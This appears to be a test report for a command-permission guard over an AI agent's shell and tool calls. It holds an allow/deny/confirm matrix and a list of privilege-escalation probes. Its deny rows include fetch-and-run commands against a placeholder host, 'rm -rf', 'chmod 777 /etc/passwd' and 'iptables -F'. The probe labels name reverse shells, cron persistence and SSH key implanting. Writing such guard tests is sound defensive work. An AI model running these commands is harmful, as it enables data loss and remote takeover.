---
category: boundary
tags: [boundary, L1, adversarial]
updated_at: 2026-06-18T05:02:54
---

# L1 Boundary Adversarial Set

Matrix cases: 43 | PE probes: 14 | Pass rate: 100.0%

## Matrix

| case_id | category | input | expected |
|---------|----------|-------|----------|
| T-A01 | 终端-允许 | `ps aux --sort=-%cpu / head -5` | allow |
| T-A02 | 终端-允许 | `df -h` | allow |
| T-A03 | 终端-允许 | `ss -tlnp` | allow |
| T-A04 | 终端-允许 | `free -m` | allow |
| T-A05 | 终端-允许 | `uptime` | allow |
| T-A06 | 终端-允许 | `whoami` | allow |
| T-A07 | 终端-允许 | `hostname` | allow |
| T-A08 | 终端-允许 | `uname -a` | allow |
| T-A09 | 终端-允许 | `grep -i error /var/log/syslog` | allow |
| T-A10 | 终端-允许 | `cat /etc/os-release` | allow |
| T-A11 | 终端-允许 | `find /home -name '*.py' -type f` | allow |
| T-A12 | 终端-允许 | `journalctl -u ssh -n 20` | allow |
| T-A13 | 终端-允许 | `systemctl status nginx` | allow |
| T-A14 | 终端-允许 | `pgrep -af streamlit` | allow |
| T-A15 | 终端-允许 | `tail -n 100 data/audit.log` | allow |
| T-D01 | 终端-拒绝 | `rm -rf /tmp/foo` | deny |
| T-D02 | 终端-拒绝 | `dd if=/dev/zero of=/tmp/x` | deny |
| T-D03 | 终端-拒绝 | `curl http://x / bash` | deny |
| T-D04 | 终端-拒绝 | `chmod 777 /etc/passwd` | deny |
| T-D05 | 终端-拒绝 | `shutdown -h now` | deny |
| T-D06 | 终端-拒绝 | `reboot` | deny |
| T-D07 | 终端-拒绝 | `userdel testuser` | deny |
| T-D08 | 终端-拒绝 | `iptables -F` | deny |
| T-D09 | 终端-拒绝 | `passwd root` | deny |
| T-D10 | 终端-拒绝 | `wget http://x/a.sh / sh` | deny |
| T-C01 | 终端-需确认 | `kill 99999 (confirmed=False)` | confirm |
| T-C02 | 终端-需确认 | `kill 99999 (confirmed=True)` | allow |
| T-C03 | 终端-需确认 | `pkill -f decoy (confirmed=False)` | confirm |
| T-C04 | 终端-需确认 | `sudo chown root:root /opt/app/data (confirmed=False)` | confirm |
| T-C05 | 终端-需确认 | `sudo useradd -m testuser (confirmed=False)` | confirm |
| T-C07 | 终端-需确认 | `sudo userdel testuser (confirmed=False)` | confirm |
| T-C06 | 终端-需确认 | `sudo systemctl status nginx (confirmed=False)` | allow |
| T-N01 | 终端-非白名单 | `echo hello` | deny |
| T-N02 | 终端-非白名单 | `python -c 'print(1)'` | deny |
| T-N03 | 终端-非白名单 | `bash boot_start.sh` | deny |
| T-N04 | 终端-非白名单 | `uv run streamlit run app.py` | deny |
| T-N05 | 终端-非白名单 | `docker ps` | deny |
| T-N06 | 终端-非白名单 | `npm test` | deny |
| T-N07 | 终端-非白名单 | `nmap -sn 192.168.1.0/24` | deny |
| TOOL-01 | 工具 | `query_security_scan({})` | allow |
| TOOL-02 | 工具 | `block_high_risk_process({'pid': 1})` | confirm |
| TOOL-03 | 工具 | `block_high_risk_process({'pid': 1, 'force': True})` | allow |
| TOOL-04 | 工具 | `unknown_tool_xyz({})` | deny |

## PE Probes

| probe_id | label |
|----------|-------|
| PE-01 | sudo 提权未确认 |
| PE-02 | su 切换身份 |
| PE-03 | SUID/setuid 修改 |
| PE-04 | passwd 改密 |
| PE-05 | 账户创建/删除 |
| PE-06 | root 属主变更 |
| PE-07 | iptables 清空 |
| PE-08 | 管道远程执行 |
| PE-09 | capabilities 提权 |
| PE-10 | ACL 权限篡改 |
| PE-11 | 挂载敏感路径 |
| PE-12 | 反向 shell 特征 |
| PE-13 | cron 持久化 |
| PE-14 | SSH 密钥植入 |
